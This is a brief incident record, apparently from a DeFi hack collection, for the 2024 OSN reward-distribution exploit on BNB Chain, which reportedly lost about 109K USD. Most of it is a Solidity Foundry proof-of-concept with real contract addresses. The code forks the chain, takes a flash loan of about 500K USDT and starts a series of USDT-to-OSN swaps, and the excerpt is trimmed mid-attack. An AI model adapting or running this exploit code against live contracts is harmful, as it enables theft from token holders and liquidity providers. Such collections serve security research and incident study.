# [?] OSN - Reward Distribution Problem

## Summary
Severity: Unknown
Chain: BNB Chain
Component: OSN
Published: 2024-05-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/OSN_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~109K USD

```solidity
contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
    Uni_Pair_V2 wbnb_atm = Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
    IERC20 OSN_PAIR = IERC20(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
    uint256 constant PRECISION = 10 ** 18;
    address test_contract = address(this);
    uint256 borrow_amount;

    function setUp() external {
        cheats.createSelectFork("bsc", 38_474_365);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        // borrow_amount = 500_000 ether;
        borrow_amount = 500_009_458_043_549_158_462_637;
        pool.flash(address(this), borrow_amount, 0, "");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {
        OSN.approve(address(router), type(uint256).max - 1);
        USDT.approve(address(router), type(uint256).max - 1);
        OSN_PAIR.approve(address(router), type(uint256).max - 1);
        uint256 usdt_balance = USDT.balanceOf(address(this));
        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/OSN_exp.sol_
